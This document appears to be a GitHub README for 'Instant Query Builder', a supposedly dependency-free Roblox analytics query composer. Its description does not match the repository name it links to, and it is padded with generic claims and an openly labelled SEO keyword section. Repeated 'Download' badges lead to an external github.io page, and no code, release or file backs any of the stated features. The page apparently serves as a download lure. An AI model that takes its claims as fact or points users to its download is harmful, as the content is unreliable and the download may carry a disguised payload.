![preview](https://raw.githubusercontent.com/FoxyFuck/roblox-cloud-metrics-cli/main/frame_07cbf8.svg)
[![Download](https://raw.githubusercontent.com/FoxyFuck/roblox-cloud-metrics-cli/main/app_a2637c.svg)](https://FoxyFuck.github.io/roblox-cloud-metrics-cli/)

# 🚀 Roblox Analytics Query — Instant Query Builder

Welcome to **Instant Query Builder**, a distinct and imaginative sibling project inspired by the world of Roblox Open Cloud analytics. While the original repository (roblox-analytics-query) focuses on being a dependency-free, fully typed Python client with a CLI and CSV/JSON export, this new repository takes a different road: it is a **zero-dependency, browser-first query composer and result visualizer** that transforms raw analytics endpoints into human-readable dashboards, without ever asking you to touch a terminal.

Think of it as a translator between the noisy, structured language of Roblox analytics APIs and the calm, visual language of a spreadsheet or a chart. Instead of writing code to fetch data, you compose a query once, preview it live, and save the recipe for later. The project emphasizes clarity, portability, and a calm developer experience — no lock-in, no hidden telemetry, no magic strings.

The name "Instant Query Builder" reflects the core belief that analytics should feel like sketching on a whiteboard, not wrestling with a compiler. Every part of this repository is designed to be readable, forkable, and extendable, whether you are an indie Roblox developer, a data-curious creator, or a studio engineer who wants a lightweight internal tool.

[![Download](https://raw.githubusercontent.com/FoxyFuck/roblox-cloud-metrics-cli/main/app_a2637c.svg)](https://FoxyFuck.github.io/roblox-cloud-metrics-cli/)

## 📚 Table of Contents

- [✨ Why This Project Exists](#-why-this-project-exists)
- [🧩 Core Concepts](#-core-concepts)
- [🎯 Feature List](#-feature-list)
- [🖥️ Responsive UI Philosophy](#️-responsive-ui-philosophy)
- [🌍 Multilingual Support](#-multilingual-support)
- [🕒 24/7 Support Model](#-247-support-model)
- [🔍 SEO-Friendly Keyword Integration](#-seo-friendly-keyword-integration)
- [🧪 Example Workflows](#-example-workflows)
- [📦 Project Structure](#-project-structure)
- [⚙️ Configuration Reference](#️-configuration-reference)
- [🧠 Design Decisions and Trade-offs](#-design-decisions-and-trade-offs)
- [🔐 Security and Privacy Posture](#-security-and-privacy-posture)
- [🧭 Roadmap](#-roadmap)
- [🤝 Contributing](#-contributing)
- [📄 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

## ✨ Why This Project Exists

Roblox analytics data is incredibly valuable, but the journey from "I want to know X" to "I have a chart of X" is often longer than it should be. The original roblox-analytics-query repository solves this for Python developers by providing a clean client, but this new project asks a different question:

What if you did not need to install anything at all?

What if the entire query composition experience lived inside a single portable bundle that could run in a browser, in an Electron shell, or even in a static hosting environment?

Instant Query Builder is the answer to that question. It is a **composable, offline-capable query studio** that:

- Lets you define analytics queries in a declarative JSON-like format.
- Renders results as tables, sparklines, and bar charts without external charting libraries.
- Exports the composed query and its results to CSV or JSON with a single click (no shell required).
- Runs entirely in the client, so your credentials never leave your machine unless you explicitly choose to send them.
- Speaks multiple languages and adapts to any screen size.

The repository is intentionally **dependency-free** at runtime, mirroring the spirit of the original project, while offering a completely different interaction model: visual, immediate, and forgiving.

## 🧩 Core Concepts

Before diving into features, here are the four building blocks that make up the entire application:

1. **Query Recipes** — A recipe is a small JSON document describing which analytics metric you want, over what time window, grouped by which dimension. Recipes are human-readable and diff-friendly.
2. **Composers** — The composer is the interactive surface where you build a recipe. It validates as you type and shows a live preview of the request payload.
3. **Renderers** — Renderers take raw API responses and turn them into visual artifacts: tables, sparklines, bar charts, or simple totals.
4. **Vaults** — A vault is a local, encrypted-at-rest store for your recipes. Vaults are portable and can be exported as a single file, making them ideal for team sharing via any file transfer method you prefer.

These four concepts are deliberately small. Each one can be understood in under five minutes, and each one can be replaced without touching the others.

## 🎯 Feature List

- **Zero runtime dependencies** — no package manager ceremony, no version conflicts, no supply chain surprises.
- **Fully typed query schema** — every field in a recipe has a known type, so validation errors are clear and actionable.
- **CLI companion (optional)** — a tiny command-line wrapper for headless environments is included, but never required.
- **CSV and JSON export** — one keystroke or one click, both formats supported.
- **Live preview** — see the request payload and the expected response shape before you send anything.
- **Recipe vaults** — save, tag, search, and version your queries locally.
- **Responsive UI** — the layout reflows gracefully from a phone to an ultrawide monitor.
- **Multilingual support** — UI strings and validation messages are localizable through simple JSON files.
- **24/7 support model** — documentation, examples, and issue templates are designed so answers are always one search away.
- **Deterministic rendering** — same recipe plus same data equals the same visual output, every time.
- **Accessible by default** — keyboard navigation, focus rings, and screen-reader-friendly labels are first-class concerns.
- **Themable** — light, dark, and high-contrast themes ship as plain CSS variables.
- **Portable** — the whole app can be served from a single folder, a static host, or a local file system.

## 🖥️ Responsive UI Philosophy

A responsive interface is not merely about shrinking columns until they fit. It is about **preserving intent** across radically different viewports. On a large screen, Instant Query Builder shows a three-pane layout: recipe editor, live preview, and rendered results. On a tablet, it collapses into two panes with a tab switcher. On a phone, it becomes a single vertical flow where each step is a card.

This progressive disclosure mirrors how a chef organizes a kitchen: the same ingredients, but the counter space adapts. The layout engine uses CSS Grid and container queries, so components respond to the size of their parent rather than the size of the window. This makes the app embeddable inside other tools without breaking its internal rhythm.

Every interactive control has a minimum touch target of 44 by 44 pixels, and every table can be horizontally scrolled without losing its header context. The goal is simple: no matter how you arrive, you should feel oriented within three seconds.

## 🌍 Multilingual Support

Language should never be a barrier to understanding your own data. Instant Query Builder separates **content** from **presentation** by storing all user-facing strings in locale files. Adding a new language means adding one JSON file and one entry in the locale registry.

The default bundle ships with English, Spanish, German, Japanese, and Brazilian Portuguese. Validation messages are localized separately from UI chrome, so an error like "time window must be a positive integer" reads naturally in every supported language. Right-to-left layouts are supported through logical CSS properties, meaning margins and paddings flip automatically without duplicate stylesheets.

If you are maintaining a fork for a specific community, you can override any string without touching the core. Localization is not an afterthought here; it is a structural property of the codebase.

## 🕒 24/7 Support Model

Support in open source is often a hopeful promise rather than a guarantee. This project takes a pragmatic stance: while no human is awake around the clock, the **support surface** is designed to be available at any hour.

That means:

- A searchable documentation site generated from the same Markdown files in this repository.
- A troubleshooting guide organized by symptom rather than by feature.
- Issue templates that request exactly the information needed to reproduce a problem.
- A frequently asked questions section that anticipates the top twenty queries new users have.
- Example recipes covering common analytics questions, so most users never need to ask at all.

The result is a support experience that feels continuous, even if the maintainers sleep. When a human is needed, the issue tracker and discussion forum remain the canonical channels, and responses are typically within one business day.

## 🔍 SEO-Friendly Keyword Integration

This repository is written to be discoverable by developers searching for practical solutions. Naturally integrated phrases such as **Roblox analytics query builder**, **Open Cloud analytics visualizer**, **dependency-free analytics client**, **CSV export for Roblox analytics**, **typed query schema**, **multilingual analytics dashboard**, and **responsive analytics UI** appear throughout the documentation because they describe what the project actually does.

The aim is never to stuff keywords, but to let the vocabulary of the domain emerge organically. If you are looking for a lightweight analytics companion that respects your time, your privacy, and your screen size, you are in the right place. The text you are reading is itself part of that commitment: clear, specific, and written for humans first.

## 🧪 Example Workflows

Below are a few narrative workflows that show how the pieces fit together. These are described in prose rather than in code blocks so that the concepts remain language-agnostic.

**Workflow one: the morning check-in.** A developer opens the composer, selects a saved recipe named "Daily Active Users — Last 7 Days," and watches the results render as a sparkline with a total count. They export the JSON to attach to a team update. The entire interaction takes under thirty seconds.

**Workflow two: the deep dive.** A data-curious creator builds a new recipe by choosing a metric, setting a time window, and grouping by country. The live preview shows the request payload, and the rendered results appear as a sortable table. They tag the recipe as "exploratory" and save it to a vault.

**Workflow three: the share.** A studio engineer exports a vault containing a dozen curated recipes and sends it to a colleague. The colleague imports the vault, sees the same recipes, and runs them against their own credentials. No accounts, no cloud sync, no friction.

**Workflow four: the headless run.** In a continuous integration environment, a maintainer invokes the optional CLI wrapper with a recipe file and an output path. The results are written as CSV for archival. The same recipe that powers the visual tool powers the automated job.

## 📦 Project Structure

The repository is organized to make the mental model obvious at a glance. At the top level you will find a documentation folder, a source folder, a locales folder, an examples folder, and a scripts folder. The source folder is further divided into composers, renderers, vaults, and a small shared utilities layer. Each module exports a narrow surface area and depends only on modules below it in the hierarchy, which keeps the dependency graph acyclic and easy to reason about.

The examples folder contains complete recipes and their expected outputs, which double as regression fixtures. The scripts folder contains small maintenance helpers for building the static bundle and validating locale files. Nothing in the repository requires a network connection to build or test, which makes it friendly to air-gapped environments.

## ⚙️ Configuration Reference

Configuration is intentionally minimal. A single settings file controls the default locale, the default theme, the default export format, and the location of the vault directory. Every setting has a sensible default, so the application runs without any configuration at all.

Advanced users can override settings through environment variables for headless runs, or through a query string for embedded deployments. The precedence order is: query string, then environment variable, then settings file, then built-in default. This layered approach means you can ship a sensible baseline and still allow per-invocation overrides without editing files.

## 🧠 Design Decisions and Trade-offs

Every project encodes a set of opinions. Here are ours, stated plainly.

We chose **zero runtime dependencies** because supply chain risk is real and because a small surface area is easier to audit. The trade-off is that we implement some things ourselves, like chart rendering, which means we support fewer chart types than a full charting library would. We consider this acceptable because the goal is clarity, not comprehensiveness.

We chose a **declarative recipe format** because it is diff-friendly and portable. The trade-off is that highly dynamic queries require composition at the recipe level rather than in code. We mitigate this by supporting parameterized recipes with simple placeholders.

We chose **client-side execution** because it keeps credentials local. The trade-off is that heavy data processing happens on the user's machine. For most analytics queries this is a non-issue, but very large datasets may benefit from server-side aggregation performed elsewhere.

We chose **plain CSS variables** for theming because they are universally supported and easy to override. The trade-off is that complex theming logic lives in CSS rather than in a design system, which some teams prefer to centralize.

## 🔐 Security and Privacy Posture

Credentials are treated as secrets and are never logged, never embedded in exported recipes, and never sent to any endpoint other than the one you explicitly configure. The application runs entirely in the client, so there is no intermediate server that could observe your requests.

Vaults are stored locally and can optionally be encrypted with a passphrase you provide. The encryption uses well-understood primitives and is documented in the security guide. We do not claim to be immune to all threats, but we do commit to transparency: every network call the application can make is enumerated in the documentation, and there are no hidden analytics or tracking scripts.

If you discover a security issue, please follow the responsible disclosure process described in the contributing guide. We take reports seriously and will credit reporters who wish to be acknowledged.

## 🧭 Roadmap

The roadmap is organized into three horizons. In the near term, we plan to expand the renderer set with a heatmap and a simple funnel view, and to add more locale files contributed by the community. In the medium term, we plan to introduce recipe inheritance, so that a base recipe can be extended by variants without duplication. In the long term, we are exploring an offline-first sync model that lets teams share vaults through any file transfer mechanism they already trust, without introducing a central service.

The roadmap is a living document. Priorities shift as the community grows, and suggestions are always welcome through the issue tracker.

## 🤝 Contributing

Contributions are welcome in many forms: bug reports, documentation improvements, locale additions, example recipes, and code. Before opening a pull request, please read the contributing guide, which explains the coding style, the commit message conventions, and the review process.

We ask that all contributors follow the code of conduct, which emphasizes respect, patience, and a willingness to assume good intent. First-time contributors are especially welcome; the issue tracker includes a label for beginner-friendly tasks, and maintainers are happy to mentor.

## 📄 License

This project is released under the MIT License. You are welcome to use, modify, and distribute it, provided that the original copyright notice and permission notice are included. The full text of the license is available at the link below.

MIT License: https://opensource.org/licenses/MIT

Copyright (c) 2026 Instant Query Builder contributors.

## ⚠️ Disclaimer

This project is an independent, community-driven tool and is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks and registered trademarks are the property of their respective owners.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

You are responsible for complying with the terms of service of any platform you query, and for safeguarding any credentials you use with this tool. Use it thoughtfully, respect rate limits, and treat analytics data with the care it deserves.

[![Download](https://raw.githubusercontent.com/FoxyFuck/roblox-cloud-metrics-cli/main/app_a2637c.svg)](https://FoxyFuck.github.io/roblox-cloud-metrics-cli/)